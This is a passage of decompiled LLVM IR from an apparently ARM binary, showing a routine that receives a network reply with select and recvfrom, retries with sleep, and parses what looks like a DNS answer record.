  %v3_11cdc = load i32, i32* %v2_11cdc, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_11ce4 = urem i32 %v0_11cc8, 32
  store i32 %v1_11ce4, i32* %r8.global-to-local, align 4
  %v7_11ce8 = shl i32 1, %v1_11ce4
  %v8_11ce8 = or i32 %v3_11cdc, %v7_11ce8
  store i32 5, i32* %ip.global-to-local, align 4
  store i32 %v8_11ce8, i32* %v2_11cdc, align 4
  %v0_11cf8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_11cf8, i32* %stack_var_-48, align 4
  store i32 %v2_11d00, i32* %lr.global-to-local, align 4
  store i32 %v2_11b58, i32* %ip.global-to-local, align 4
  %v0_11d08 = load i32, i32* %r7.global-to-local, align 4
  %v1_11d08 = load i32, i32* %r3.global-to-local, align 4
  %v2_11d08 = add i32 %v1_11d08, %v0_11d08
  store i32 %v2_11d08, i32* %r0.global-to-local, align 4
  store i32 %v2_11c30, i32* %r1.global-to-local, align 4
  %v0_11d14 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11d14, i32* %r2.global-to-local, align 4
  store i32 %v0_11d14, i32* %r3.global-to-local, align 4
  %v5_11d20 = call i32 @_select(i32 %v2_11d08, i32 %v2_11c30, i32 %v0_11d14, i32 %v0_11d14, i32 %v2_11d00)
  store i32 %v5_11d20, i32* %r0.global-to-local, align 4
  %v7_11d24 = icmp eq i32 %v5_11d20, -1
  store i1 %v7_11d24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11d24, label %dec_label_pc_11da0, label %dec_label_pc_11d2c

dec_label_pc_11d2c:                               ; preds = %dec_label_pc_11cc8
  %v2_11d2c = icmp eq i32 %v5_11d20, 0
  store i1 %v2_11d2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11d2c, label %dec_label_pc_11d80, label %dec_label_pc_11d34

dec_label_pc_11d34:                               ; preds = %dec_label_pc_11d2c
  %v0_11d34 = load i32, i32* %r5.global-to-local, align 4
  %v1_11d34 = add i32 %v0_11d34, -156
  %v2_11d34 = inttoptr i32 %v1_11d34 to i32*
  %v3_11d34 = load i32, i32* %v2_11d34, align 4
  %v1_11d38 = load i32, i32* %r8.global-to-local, align 4
  %v6_11d38 = ashr i32 %v3_11d34, %v1_11d38
  store i32 %v6_11d38, i32* %r3.global-to-local, align 4
  %v1_11d3c = urem i32 %v6_11d38, 2
  %v2_11d3c = icmp eq i32 %v1_11d3c, 0
  store i1 %v2_11d3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11d3c, label %dec_label_pc_11da0, label %dec_label_pc_11d44

dec_label_pc_11d44:                               ; preds = %dec_label_pc_11d34
  store i32 %v2_11bf8, i32* %r1.global-to-local, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11d50 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_11d50, i32* %r0.global-to-local, align 4
  %v0_11d54 = load i32, i32* %r4.global-to-local, align 4
  %v6_11d5c = call i32 @_recvfrom(i32 %v0_11d50, i32 %v2_11bf8, i32 2048, i32 16384, i32 %v0_11d54, i32 %v0_11d54)
  store i32 %v6_11d5c, i32* %r4.global-to-local, align 4
  %v0_11d64 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_11d64, i32* %r0.global-to-local, align 4
  %v1_11d68 = inttoptr i32 %v0_11d64 to i8*
  %v2_11d68 = call i32 @function_1460c(i8* %v1_11d68)
  %v1_11d6c = add i32 %v2_11d68, 17
  store i32 %v1_11d6c, i32* %r0.global-to-local, align 4
  %v0_11d70 = load i32, i32* %r4.global-to-local, align 4
  %v3_11d70 = icmp ult i32 %v0_11d70, %v1_11d6c
  %v9_11d70 = icmp eq i32 %v0_11d70, %v1_11d6c
  store i1 %v9_11d70, i1* %cpsr_z.global-to-local, align 1
  store i32 -4252, i32* %r4.global-to-local, align 4
  br i1 %v3_11d70, label %dec_label_pc_11d80, label %dec_label_pc_11dd4

dec_label_pc_11d80:                               ; preds = %dec_label_pc_11d44, %dec_label_pc_11dd4, %dec_label_pc_11e10, %dec_label_pc_11d2c, %dec_label_pc_11dc8
  %v0_11d80 = load i32, i32* %sl.global-to-local, align 4
  %v7_11d80 = icmp eq i32 %v0_11d80, 5
  store i1 %v7_11d80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11d80, label %dec_label_pc_11da0, label %dec_label_pc_11d88

dec_label_pc_11d88:                               ; preds = %dec_label_pc_11d90, %dec_label_pc_11d80
  %v0_11d88 = phi i32 [ %v0_11d98, %dec_label_pc_11d90 ], [ %v0_11d80, %dec_label_pc_11d80 ]
  %v1_11d88 = add i32 %v0_11d88, 1
  store i32 %v1_11d88, i32* %sl.global-to-local, align 4
  %v0_11c34.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11c34

dec_label_pc_11d90:                               ; preds = %dec_label_pc_11c74, %dec_label_pc_11c5c
  %v0_11d90 = phi i32 [ %v4_11c84, %dec_label_pc_11c74 ], [ %v3_11c68, %dec_label_pc_11c5c ]
  %v1_11d90 = add i32 %v0_11d90, 2
  store i32 %v1_11d90, i32* %r0.global-to-local, align 4
  %v1_11d94 = call i32 @_sleep(i32 %v1_11d90)
  store i32 %v1_11d94, i32* %r0.global-to-local, align 4
  %v0_11d98 = load i32, i32* %sl.global-to-local, align 4
  %v7_11d98 = icmp eq i32 %v0_11d98, 5
  store i1 %v7_11d98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11d98, label %dec_label_pc_11da0, label %dec_label_pc_11d88

dec_label_pc_11da0:                               ; preds = %dec_label_pc_11d90, %dec_label_pc_11d80, %dec_label_pc_11d34, %dec_label_pc_11cc8, %dec_label_pc_11e20, %dec_label_pc_11e2c.backedge
  %v0_11da0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_11da0, i32* %r0.global-to-local, align 4
  %v1_11da4 = call i32 @_close(i32 %v0_11da0)
  store i32 %v1_11da4, i32* %r0.global-to-local, align 4
  store i32 %v2_11ad8, i32* %r2.global-to-local, align 4
  %v2_11dac = load i8, i8* %v3_11ad8, align 1
  %v3_11dac = zext i8 %v2_11dac to i32
  store i32 %v3_11dac, i32* %r4.global-to-local, align 4
  %v2_11db0 = icmp eq i8 %v2_11dac, 0
  store i1 %v2_11db0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11db0, label %dec_label_pc_11f0c, label %dec_label_pc_11db8

dec_label_pc_11db8:                               ; preds = %dec_label_pc_11da0, %dec_label_pc_11f0c
  %stack_var_-4300.0 = phi i8* [ %v5_11f20, %dec_label_pc_11f0c ], [ %v3_11ad8, %dec_label_pc_11da0 ]
  %v4_11db8 = ptrtoint i8* %stack_var_-4300.0 to i32
  store i32 %v4_11db8, i32* %r0.global-to-local, align 4
  %v2_11dc4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_11dc4, i32* @r4, align 4
  ret i32 %v4_11db8

dec_label_pc_11dc8:                               ; preds = %bb126
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_11dcc = call i32 @_sleep(i32 1)
  store i32 %v1_11dcc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11d80

dec_label_pc_11dd4:                               ; preds = %dec_label_pc_11d44
  store i32 %v2_11bf8, i32* %lr.global-to-local, align 4
  store i32 %v1_11dd8, i32* %fp.global-to-local, align 4
  store i32 %v1_11dd8, i32* %r0.global-to-local, align 4
  %v2_11de0 = call i32 @function_1460c(i8* %v1_11de0)
  store i32 %v2_11de0, i32* %r0.global-to-local, align 4
  store i32 %v2_11bf8, i32* %ip.global-to-local, align 4
  store i32 %v2_11cd4, i32* %r1.global-to-local, align 4
  %v4_11df0 = load i8, i8* %stack_var_-4288, align 1
  %v5_11df0 = sext i8 %v4_11df0 to i32
  store i32 %v5_11df0, i32* %r3.global-to-local, align 4
  %v3_11df4 = load i8, i8* %v2_11df4, align 1
  %v4_11df4 = zext i8 %v3_11df4 to i32
  store i32 %v4_11df4, i32* %r2.global-to-local, align 4
  store i32 %v4_11bac, i32* %lr.global-to-local, align 4
  %v4_11dfc = mul nuw nsw i32 %v4_11df4, 256
  %v5_11dfc = or i32 %v4_11dfc, %v5_11df0
  store i32 %v5_11dfc, i32* %r3.global-to-local, align 4
  %v0_11e00 = load i32, i32* %fp.global-to-local, align 4
  %v9_11e04 = icmp eq i32 %v5_11dfc, %v4_11bac
  store i1 %v9_11e04, i1* %cpsr_z.global-to-local, align 1
  %v2_11e00 = add i32 %v2_11de0, 5
  %v1_11e08 = add i32 %v2_11e00, %v0_11e00
  store i32 %v1_11e08, i32* %r0.global-to-local, align 4
  br i1 %v9_11e04, label %dec_label_pc_11e10, label %dec_label_pc_11d80

dec_label_pc_11e10:                               ; preds = %dec_label_pc_11dd4
  %v3_11e10 = load i8, i8* %v2_11e10, align 1
  %v4_11e10 = zext i8 %v3_11e10 to i32
  store i32 %v4_11e10, i32* %r2.global-to-local, align 4
  %v3_11e14 = load i8, i8* %v2_11e14, align 1
  %v4_11e14 = zext i8 %v3_11e14 to i32
  store i32 %v4_11e14, i32* %r3.global-to-local, align 4
  %v4_11e18 = mul nuw nsw i32 %v4_11e14, 256
  %v5_11e18 = or i32 %v4_11e18, %v4_11e10
  store i32 %v5_11e18, i32* %r2.global-to-local, align 4
  %v7_11e18 = icmp eq i32 %v5_11e18, 0
  store i1 %v7_11e18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11e18, label %dec_label_pc_11d80, label %dec_label_pc_11e20

dec_label_pc_11e20:                               ; preds = %dec_label_pc_11e10
  %v3_11e24 = mul nuw nsw i32 %v4_11e10, 256
  %v5_11e28 = or i32 %v4_11e14, %v3_11e24
  %v1_11ee0 = add i32 %v2_11bf8, -49152
  %v1_11e2c143 = add nsw i32 %v5_11e28, -1
  %v3_11e30144 = mul i32 %v1_11e2c143, 65536
  store i32 %v3_11e30144, i32* %r3.global-to-local, align 4
  %v7_11e34150 = icmp eq i32 %v3_11e30144, -65536
  store i1 %v7_11e34150, i1* %cpsr_z.global-to-local, align 1
  %v3_11e38151 = urem i32 %v1_11e2c143, 65536
  store i32 %v3_11e38151, i32* %r6.global-to-local, align 4
  br i1 %v7_11e34150, label %dec_label_pc_11da0, label %dec_label_pc_11e40.lr.ph

dec_label_pc_11e40.lr.ph:                         ; preds = %dec_label_pc_11e20
  %v1_11fbc = add i32 %v2_11ad8, 4
  %v2_11fbc = inttoptr i32 %v1_11fbc to i32*
  br label %dec_label_pc_11e40

dec_label_pc_11e40:                               ; preds = %dec_label_pc_11e40.lr.ph, %dec_label_pc_11e2c.backedge
  %v3_11e38153 = phi i32 [ %v3_11e38151, %dec_label_pc_11e40.lr.ph ], [ %v3_11e38, %dec_label_pc_11e2c.backedge ]
  %v0_11e94152 = phi i32 [ %v1_11e08, %dec_label_pc_11e40.lr.ph ], [ %storemerge, %dec_label_pc_11e2c.backedge ]
  store i32 %v0_11e94152, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  store i32 1, i32* %ip.global-to-local, align 4
  %v1_11e4c17 = inttoptr i32 %v0_11e94152 to i8*
  %v2_11e4c18 = load i8, i8* %v1_11e4c17, align 1
  %v3_11e4c19 = zext i8 %v2_11e4c18 to i32
  store i32 %v3_11e4c19, i32* %r2.global-to-local, align 4
  %v2_11e5020 = icmp eq i8 %v2_11e4c18, 0
  store i1 %v2_11e5020, i1* %cpsr_z.global-to-local, align 1
  %v3_11e5421 = mul nuw nsw i32 %v3_11e4c19, 256
  store i32 %v3_11e5421, i32* %r1.global-to-local, align 4
  br i1 %v2_11e5020, label %dec_label_pc_11e8c, label %dec_label_pc_11e5c.preheader

dec_label_pc_11e5c.preheader:                     ; preds = %dec_label_pc_11e40, %dec_label_pc_11e4c.backedge
  %v1_11f30 = phi i32 [ %v1_11f3049, %dec_label_pc_11e4c.backedge ], [ 1, %dec_label_pc_11e40 ]
  %v0_11f2847 = phi i32 [ %v0_11f28, %dec_label_pc_11e4c.backedge ], [ 0, %dec_label_pc_11e40 ]
  %v0_11e6845 = phi i32 [ %v3_11e54, %dec_label_pc_11e4c.backedge ], [ %v3_11e5421, %dec_label_pc_11e40 ]
  %v0_11e6443 = phi i32 [ %v1_11f2c, %dec_label_pc_11e4c.backedge ], [ %v0_11e94152, %dec_label_pc_11e40 ]
  %v0_11e5c41 = phi i32 [ %v3_11e4c, %dec_label_pc_11e4c.backedge ], [ %v3_11e4c19, %dec_label_pc_11e40 ]
  br label %dec_label_pc_11e5c

dec_label_pc_11e5c:                               ; preds = %dec_label_pc_11e5c.preheader, %dec_label_pc_11e64
  %v0_11f28 = phi i32 [ %v0_11f2847, %dec_label_pc_11e5c.preheader ], [ 1, %dec_label_pc_11e64 ]
  %v0_11e68 = phi i32 [ %v0_11e6845, %dec_label_pc_11e5c.preheader ], [ %v3_11e84, %dec_label_pc_11e64 ]
  %v0_11f2c = phi i32 [ %v0_11e6443, %dec_label_pc_11e5c.preheader ], [ %v2_11e74, %dec_label_pc_11e64 ]
  %v0_11e5c = phi i32 [ %v0_11e5c41, %dec_label_pc_11e5c.preheader ], [ %v3_11e78, %dec_label_pc_11e64 ]
  %v7_11e5c = icmp eq i32 %v0_11e5c, 191
  store i1 %v7_11e5c, i1* %cpsr_z.global-to-local, align 1
  %tmp180 = icmp ult i32 %v0_11e5c, 192
  br i1 %tmp180, label %dec_label_pc_11f28, label %dec_label_pc_11e64

dec_label_pc_11e64:                               ; preds = %dec_label_pc_11e5c
  %v1_11e64 = add i32 %v0_11f2c, 1
  %v2_11e64 = inttoptr i32 %v1_11e64 to i8*
  %v3_11e64 = load i8, i8* %v2_11e64, align 1
  %v4_11e64 = zext i8 %v3_11e64 to i32
  store i32 %v2_11bf8, i32* %r1.global-to-local, align 4
  %v2_11e68 = add i32 %v0_11e68, %v1_11ee0
  %v2_11e74 = add i32 %v2_11e68, %v4_11e64
  store i32 %v2_11e74, i32* %r3.global-to-local, align 4
  %v1_11e78 = inttoptr i32 %v2_11e74 to i8*
  %v2_11e78 = load i8, i8* %v1_11e78, align 1
  %v3_11e78 = zext i8 %v2_11e78 to i32
  store i32 %v3_11e78, i32* %r2.global-to-local, align 4
  %v2_11e7c = icmp eq i8 %v2_11e78, 0
  store i1 %v2_11e7c, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %lr.global-to-local, align 4
  %v3_11e84 = mul nuw nsw i32 %v3_11e78, 256
  store i32 %v3_11e84, i32* %r1.global-to-local, align 4
  br i1 %v2_11e7c, label %dec_label_pc_11e8c, label %dec_label_pc_11e5c

dec_label_pc_11e8c:                               ; preds = %dec_label_pc_11e4c.backedge, %dec_label_pc_11e64, %dec_label_pc_11e40
  %v1_11e90 = phi i32 [ 1, %dec_label_pc_11e40 ], [ %v1_11f30, %dec_label_pc_11e64 ], [ %v1_11f3049, %dec_label_pc_11e4c.backedge ]
  %v0_11e8c = phi i32 [ 0, %dec_label_pc_11e40 ], [ 1, %dec_label_pc_11e64 ], [ %v0_11f28, %dec_label_pc_11e4c.backedge ]
  %v7_11e8c = icmp eq i32 %v0_11e8c, 1
  store i1 %v7_11e8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11e8c, label %bb127, label %bb128

bb127:                                            ; preds = %dec_label_pc_11e8c
  %v2_11e90 = add i32 %v1_11e90, 1
  store i32 %v2_11e90, i32* %ip.global-to-local, align 4
  br label %bb128

bb128:                                            ; preds = %dec_label_pc_11e8c, %bb127
  %v1_11e94 = phi i32 [ %v1_11e90, %dec_label_pc_11e8c ], [ %v2_11e90, %bb127 ]
  %v2_11e94 = add i32 %v1_11e94, %v0_11e94152
  store i32 %v2_11e94, i32* %r4.global-to-local, align 4
  %v3_11e98 = inttoptr i32 %v2_11e94 to i8*
  %v4_11e98 = load i8, i8* %v3_11e98, align 1
  %v6_11e98 = zext i8 %v4_11e98 to i32
  store i32 %v6_11e98, i32* %r3.global-to-local, align 4
  %v1_11e9c = add i32 %v2_11e94, 1
  %v2_11e9c = inttoptr i32 %v1_11e9c to i8*
  %v3_11e9c = load i8, i8* %v2_11e9c, align 1
  %v4_11e9c = zext i8 %v3_11e9c to i32
  store i32 %v4_11e9c, i32* %r2.global-to-local, align 4
  %v4_11ea0 = mul nuw nsw i32 %v4_11e9c, 256
  %v5_11ea0 = or i32 %v4_11ea0, %v6_11e98
  store i32 %v5_11ea0, i32* %r3.global-to-local, align 4
  %v7_11ea4 = icmp eq i32 %v5_11ea0, 256
  store i1 %v7_11ea4, i1* %cpsr_z.global-to-local, align 1
  %v1_11ea8 = add i32 %v2_11e94, 10
  store i32 %v1_11ea8, i32* %r5.global-to-local, align 4
  br i1 %v7_11ea4, label %dec_label_pc_11f48, label %dec_label_pc_11eb0

dec_label_pc_11eb0:                               ; preds = %dec_label_pc_11f48, %bb128
  store i32 %v1_11ea8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_11ebc23 = inttoptr i32 %v1_11ea8 to i8*
  %v2_11ebc24 = load i8, i8* %v1_11ebc23, align 1
  %v3_11ebc25 = zext i8 %v2_11ebc24 to i32
  store i32 %v3_11ebc25, i32* %r2.global-to-local, align 4
  %v2_11ec026 = icmp eq i8 %v2_11ebc24, 0
  store i1 %v2_11ec026, i1* %cpsr_z.global-to-local, align 1
  %v3_11ec427 = mul nuw nsw i32 %v3_11ebc25, 256
  store i32 %v3_11ec427, i32* %r1.global-to-local, align 4
  br i1 %v2_11ec026, label %dec_label_pc_11efc, label %dec_label_pc_11ecc.preheader

dec_label_pc_11ecc.preheader:                     ; preds = %dec_label_pc_11eb0, %dec_label_pc_11ebc.backedge
  %v1_11f40 = phi i32 [ %v1_11f4064, %dec_label_pc_11ebc.backedge ], [ 1, %dec_label_pc_11eb0 ]
  %v0_11f3862 = phi i32 [ %v0_11f38, %dec_label_pc_11ebc.backedge ], [ 0, %dec_label_pc_11eb0 ]
  %v0_11ed860 = phi i32 [ %v3_11ec4, %dec_label_pc_11ebc.backedge ], [ %v3_11ec427, %dec_label_pc_11eb0 ]
  %v0_11ed458 = phi i32 [ %v1_11f3c, %dec_label_pc_11ebc.backedge ], [ %v1_11ea8, %dec_label_pc_11eb0 ]
  %v0_11ecc56 = phi i32 [ %v3_11ebc, %dec_label_pc_11ebc.backedge ], [ %v3_11ebc25, %dec_label_pc_11eb0 ]
  br label %dec_label_pc_11ecc

dec_label_pc_11ecc:                               ; preds = %dec_label_pc_11ecc.preheader, %dec_label_pc_11ed4
  %v0_11f38 = phi i32 [ %v0_11f3862, %dec_label_pc_11ecc.preheader ], [ 1, %dec_label_pc_11ed4 ]
  %v0_11ed8 = phi i32 [ %v0_11ed860, %dec_label_pc_11ecc.preheader ], [ %v3_11ef4, %dec_label_pc_11ed4 ]
  %v0_11f3c = phi i32 [ %v0_11ed458, %dec_label_pc_11ecc.preheader ], [ %v2_11ee4, %dec_label_pc_11ed4 ]
  %v0_11ecc = phi i32 [ %v0_11ecc56, %dec_label_pc_11ecc.preheader ], [ %v3_11ee8, %dec_label_pc_11ed4 ]
  %v7_11ecc = icmp eq i32 %v0_11ecc, 191
  store i1 %v7_11ecc, i1* %cpsr_z.global-to-local, align 1
  %tmp181 = icmp ult i32 %v0_11ecc, 192
  br i1 %tmp181, label %dec_label_pc_11f38, label %dec_label_pc_11ed4

dec_label_pc_11ed4:                               ; preds = %dec_label_pc_11ecc
  %v1_11ed4 = add i32 %v0_11f3c, 1
  %v2_11ed4 = inttoptr i32 %v1_11ed4 to i8*
  %v3_11ed4 = load i8, i8* %v2_11ed4, align 1
  %v4_11ed4 = zext i8 %v3_11ed4 to i32
  store i32 %v2_11bf8, i32* %r1.global-to-local, align 4
  %v2_11ed8 = add i32 %v0_11ed8, %v1_11ee0
  %v2_11ee4 = add i32 %v2_11ed8, %v4_11ed4
  store i32 %v2_11ee4, i32* %r3.global-to-local, align 4
  %v1_11ee8 = inttoptr i32 %v2_11ee4 to i8*
  %v2_11ee8 = load i8, i8* %v1_11ee8, align 1
  %v3_11ee8 = zext i8 %v2_11ee8 to i32
  store i32 %v3_11ee8, i32* %r2.global-to-local, align 4
  %v2_11eec = icmp eq i8 %v2_11ee8, 0
  store i1 %v2_11eec, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %ip.global-to-local, align 4
  %v3_11ef4 = mul nuw nsw i32 %v3_11ee8, 256
  store i32 %v3_11ef4, i32* %r1.global-to-local, align 4
  br i1 %v2_11eec, label %dec_label_pc_11efc, label %dec_label_pc_11ecc

dec_label_pc_11efc:                               ; preds = %dec_label_pc_11ebc.backedge, %dec_label_pc_11ed4, %dec_label_pc_11eb0
  %v1_11f00 = phi i32 [ 1, %dec_label_pc_11eb0 ], [ %v1_11f40, %dec_label_pc_11ed4 ], [ %v1_11f4064, %dec_label_pc_11ebc.backedge ]
  %v0_11efc = phi i32 [ 0, %dec_label_pc_11eb0 ], [ 1, %dec_label_pc_11ed4 ], [ %v0_11f38, %dec_label_pc_11ebc.backedge ]
  %v7_11efc = icmp eq i32 %v0_11efc, 1
  store i1 %v7_11efc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11efc, label %bb129, label %bb130

bb129:                                            ; preds = %dec_label_pc_11efc
  %v2_11f00 = add i32 %v1_11f00, 1
  store i32 %v2_11f00, i32* %r0.global-to-local, align 4
  br label %bb130

bb130:                                            ; preds = %dec_label_pc_11efc, %bb129
  %v1_11f04 = phi i32 [ %v1_11f00, %dec_label_pc_11efc ], [ %v2_11f00, %bb129 ]
  %v2_11f04 = add i32 %v1_11f04, %v1_11ea8
  br label %dec_label_pc_11e2c.backedge

dec_label_pc_11e2c.backedge:                      ; preds = %bb130, %dec_label_pc_11ff0
  %v0_11e2c.pre = phi i32 [ %v3_11e38153, %bb130 ], [ %v0_11e2c.pre.pre, %dec_label_pc_11ff0 ]
  %storemerge = phi i32 [ %v2_11f04, %bb130 ], [ %v2_12004, %dec_label_pc_11ff0 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_11e2c = add i32 %v0_11e2c.pre, -1
  %v3_11e30 = mul i32 %v1_11e2c, 65536
  store i32 %v3_11e30, i32* %r3.global-to-local, align 4
  %v7_11e34 = icmp eq i32 %v3_11e30, -65536
  store i1 %v7_11e34, i1* %cpsr_z.global-to-local, align 1
  %v3_11e38 = urem i32 %v1_11e2c, 65536
  store i32 %v3_11e38, i32* %r6.global-to-local, align 4
  br i1 %v7_11e34, label %dec_label_pc_11da0, label %dec_label_pc_11e40

dec_label_pc_11f0c:                               ; preds = %dec_label_pc_11da0
  %v1_11f0c = add i32 %v2_11ad8, 4
  %v2_11f0c = inttoptr i32 %v1_11f0c to i32*
  %v3_11f0c = load i32, i32* %v2_11f0c, align 4
  store i32 %v3_11f0c, i32* %r0.global-to-local, align 4
  %v2_11f10 = icmp eq i32 %v3_11f0c, 0
  store i1 %v2_11f10, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_11f18.239 to i32), i32* %lr.global-to-local, align 4
  %v1_11f14 = xor i1 %v2_11f10, true
  call void @__pseudo_cond_branch(i1 %v1_11f14, i32 ptrtoint (i32* @global_var_8de4.113 to i32))
  store i32 %v2_11ad8, i32* %r0.global-to-local, align 4
  %v1_11f1c = call i32 @_free(i32 %v2_11ad8)
  store i32 %v1_11f1c, i32* %r0.global-to-local, align 4
  %v0_11f20 = load i32, i32* %r4.global-to-local, align 4
  %v5_11f20 = inttoptr i32 %v0_11f20 to i8*
  br label %dec_label_pc_11db8

dec_label_pc_11f28:                               ; preds = %dec_label_pc_11e5c
  %v2_11f28 = icmp eq i32 %v0_11f28, 0
  store i1 %v2_11f28, i1* %cpsr_z.global-to-local, align 1
  %v1_11f2c = add i32 %v0_11f2c, 1
  store i32 %v1_11f2c, i32* %r3.global-to-local, align 4
  br i1 %v2_11f28, label %bb131, label %dec_label_pc_11e4c.backedge

dec_label_pc_11e4c.backedge:                      ; preds = %dec_label_pc_11f28, %bb131
  %v1_11f3049 = phi i32 [ %v1_11f30, %dec_label_pc_11f28 ], [ %v2_11f30, %bb131 ]
  %v1_11e4c = inttoptr i32 %v1_11f2c to i8*
  %v2_11e4c = load i8, i8* %v1_11e4c, align 1
  %v3_11e4c = zext i8 %v2_11e4c to i32
  store i32 %v3_11e4c, i32* %r2.global-to-local, align 4
  %v2_11e50 = icmp eq i8 %v2_11e4c, 0
  store i1 %v2_11e50, i1* %cpsr_z.global-to-local, align 1
  %v3_11e54 = mul nuw nsw i32 %v3_11e4c, 256
  store i32 %v3_11e54, i32* %r1.global-to-local, align 4
  br i1 %v2_11e50, label %dec_label_pc_11e8c, label %dec_label_pc_11e5c.preheader

bb131:                                            ; preds = %dec_label_pc_11f28
  %v2_11f30 = add i32 %v1_11f30, 1
  store i32 %v2_11f30, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11e4c.backedge

dec_label_pc_11f38:                               ; preds = %dec_label_pc_11ecc
  %v2_11f38 = icmp eq i32 %v0_11f38, 0
  store i1 %v2_11f38, i1* %cpsr_z.global-to-local, align 1
  %v1_11f3c = add i32 %v0_11f3c, 1
  store i32 %v1_11f3c, i32* %r3.global-to-local, align 4
  br i1 %v2_11f38, label %bb132, label %dec_label_pc_11ebc.backedge

dec_label_pc_11ebc.backedge:                      ; preds = %dec_label_pc_11f38, %bb132
  %v1_11f4064 = phi i32 [ %v1_11f40, %dec_label_pc_11f38 ], [ %v2_11f40, %bb132 ]
  %v1_11ebc = inttoptr i32 %v1_11f3c to i8*
  %v2_11ebc = load i8, i8* %v1_11ebc, align 1
  %v3_11ebc = zext i8 %v2_11ebc to i32
  store i32 %v3_11ebc, i32* %r2.global-to-local, align 4
  %v2_11ec0 = icmp eq i8 %v2_11ebc, 0
  store i1 %v2_11ec0, i1* %cpsr_z.global-to-local, align 1
  %v3_11ec4 = mul nuw nsw i32 %v3_11ebc, 256
  store i32 %v3_11ec4, i32* %r1.global-to-local, align 4
  br i1 %v2_11ec0, label %dec_label_pc_11efc, label %dec_label_pc_11ecc.preheader

bb132:                                            ; preds = %dec_label_pc_11f38
  %v2_11f40 = add i32 %v1_11f40, 1
  store i32 %v2_11f40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11ebc.backedge

dec_label_pc_11f48:                               ; preds = %bb128
  %v1_11f48 = add i32 %v2_11e94, 2
  %v2_11f48 = inttoptr i32 %v1_11f48 to i8*
  %v3_11f48 = load i8, i8* %v2_11f48, align 1
  %v4_11f48 = zext i8 %v3_11f48 to i32
  store i32 %v4_11f48, i32* %r3.global-to-local, align 4
  %v1_11f4c = add i32 %v2_11e94, 3
  %v2_11f4c = inttoptr i32 %v1_11f4c to i8*
  %v3_11f4c = load i8, i8* %v2_11f4c, align 1
  %v4_11f4c = zext i8 %v3_11f4c to i32
  store i32 %v4_11f4c, i32* %r2.global-to-local, align 4
  %v4_11f50 = mul nuw nsw i32 %v4_11f4c, 256
  %v5_11f50 = or i32 %v4_11f50, %v4_11f48
  store i32 %v5_11f50, i32* %r3.global-to-local, align 4
  %v7_11f54 = icmp eq i32 %v5_11f50, 256
  store i1 %v7_11f54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11f54, label %dec_label_pc_11f5c, label %dec_label_pc_11eb0

dec_label_pc_11f5c:                               ; preds = %dec_label_pc_11f48
  %v1_11f5c = add i32 %v2_11e94, 8
  %v2_11f5c = inttoptr i32 %v1_11f5c to i8*
  %v3_11f5c = load i8, i8* %v2_11f5c, align 1
  %v4_11f5c = zext i8 %v3_11f5c to i32
  store i32 %v4_11f5c, i32* %r1.global-to-local, align 4
  %v1_11f60 = add i32 %v2_11e94, 9
  %v2_11f60 = inttoptr i32 %v1_11f60 to i8*
  %v3_11f60 = load i8, i8* %v2_11f60, align 1
  %v4_11f60 = zext i8 %v3_11f60 to i32
  store i32 %v4_11f60, i32* %r0.global-to-local, align 4
  %v4_11f64 = mul nuw nsw i32 %v4_11f60, 256
  %v5_11f64 = or i32 %v4_11f64, %v4_11f5c
  %v3_11f68 = mul i32 %v5_11f64, 65536
  store i32 %v3_11f68, i32* %r2.global-to-local, align 4
  %v3_11f6c = mul nuw nsw i32 %v4_11f5c, 256
  %v5_11f74 = or i32 %v4_11f60, %v3_11f6c
  store i32 %v5_11f74, i32* %r3.global-to-local, align 4
  %v7_11f78 = icmp eq i32 %v5_11f74, 4
  store i1 %v7_11f78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11f78, label %dec_label_pc_11f80, label %dec_label_pc_11ff0

dec_label_pc_11f80:                               ; preds = %dec_label_pc_11f5c
  %v2_11f80 = inttoptr i32 %v1_11ea8 to i8*
  %v3_11f80 = load i8, i8* %v2_11f80, align 1
  %v4_11f80 = zext i8 %v3_11f80 to i32
  store i32 %v4_11f80, i32* %r3.global-to-local, align 4
  store i32 %v2_11b58, i32* %r2.global-to-local, align 4
  %v1_11f8c = add i32 %v2_11e94, 11
  %v2_11f8c = inttoptr i32 %v1_11f8c to i8*
  %v3_11f8c = load i8, i8* %v2_11f8c, align 1
  %v4_11f8c = zext i8 %v3_11f8c to i32
  store i32 %v4_11f8c, i32* %r2.global-to-local, align 4
  store i32 %v2_11b58, i32* %r3.global-to-local, align 4
  %v1_11f98 = add i32 %v2_11e94, 12
  %v2_11f98 = inttoptr i32 %v1_11f98 to i8*
  %v3_11f98 = load i8, i8* %v2_11f98, align 1
  %v4_11f98 = zext i8 %v3_11f98 to i32
  store i32 %v4_11f98, i32* %r3.global-to-local, align 4
  store i32 %v2_11b58, i32* %ip.global-to-local, align 4
  %v1_11fa4 = add i32 %v2_11e94, 13
